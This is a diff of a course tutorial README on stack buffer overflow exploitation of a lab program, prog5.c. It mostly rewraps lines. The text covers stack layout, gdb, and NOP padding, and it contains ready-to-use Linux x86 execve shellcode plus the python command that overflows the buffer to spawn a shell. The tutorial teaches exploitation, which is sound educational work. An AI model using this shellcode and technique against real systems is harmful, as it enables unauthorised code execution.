@@ -1,4 +1,6 @@
-This is a tutorial of buffer based stack overflow attacks. Credit to 'Smashing The Stack For Fun And Profit by Aleph One' for a detailed description of how to do this and Manuel Egele megele@bu.edu for creating the challenge and being a great professor (specifically providing prog5.c and the template for how to create exploit.py)
+This is a tutorial of buffer based stack overflow attacks. Credit to 'Smashing The Stack For Fun And Profit by Aleph One' 
+for a detailed description of how to do this and Manuel Egele megele@bu.edu for creating the challenge and being a great 
+professor (specifically providing prog5.c and the template for how to create exploit.py).
 
 
 # ---------- prog5.c source ------------------ #
@@ -111,7 +113,8 @@ So ===> 512 bytes for buffer, 8 bytes for stack and base pointers,
 	to main.
 
 
-Now that you have an idea of what the stack looks like and where the stored eip pointer (return address to main) is stored, you are going to need code that opens a new shell.
+Now that you have an idea of what the stack looks like and where the stored eip pointer (return address to main) 
+is stored, you are going to need code that opens a new shell.
 A shell script is assembly built to open a new shell encoded so python can print it correctly.
 
 The shell code I used: (source - http://shell-storm.org/shellcode/files/shellcode-811.php)
@@ -121,14 +124,16 @@ The shell code I used: (source - http://shell-storm.org/shellcode/files/shellcod
 	* note that this shell code only works on Linux x86 systems. Find your systems code on shell-storm.org *
 	* more on shell code: https://en.wikipedia.org/wiki/Shellcode *
 
-	code used:	\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x60\x4b\xff\xff
+	code used:	\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2
+			\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x60\x4b\xff\xff
 
 
 
 The last bit of information you need to collect is a new return address to replace the stored eip pointer.
 
 You can get this using gdb:
-	This is a tricky part because the address on the stack could change at any time if, for instance, any environment variables change or the size of anything in your program changes.
+	This is a tricky part because the address on the stack could change at any time if, for instance, any 
+	environment variables change or the size of anything in your program changes.
 
 
 Running gdb without the worry of environment variables:
@@ -172,21 +177,25 @@ Now that you have the program running correctly in gdb, you need to:
 	Save that address and use it as your new return address to replace the stored eip pointer.
 
 
-Taking into account all the above, you will need 524 bytes total. 520 for buffer and stored pointers, 4 for overwriting the return address.
+Taking into account all the above, you will need 524 bytes total. 520 for buffer and stored pointers, 4 for overwriting 
+the return address.
 
 But you have one more problem. What do you do with the extra space in the buffer that is not used by your shell code?
-Easy, padd it with nops. These are no operation assembly instructions that tell the system to just go to the next line. Encoded as '\x90'
+Easy, padd it with nops. These are no operation assembly instructions that tell the system to just go to the next line. 
+Encoded as '\x90'
 
 So ===>
 
 You can now write a python script that prints out the shell code at the correct size, padded by the nops:
 
-	`python -c 'print "\x90"*492 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x60\x4b\xff\xff"'`
+	`python -c 'print "\x90"*492 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89
+		\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x60\x4b\xff\xff"'`
 
 
 you can launch your new shell by running the prog5 executable with the above python script as the input:
 
-	$ prog5 `python -c 'print "\x90"*492 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x60\x4b\xff\xff"'`
+	$ prog5 `python -c 'print "\x90"*492 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89
+		\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x60\x4b\xff\xff"'`
 
 
 
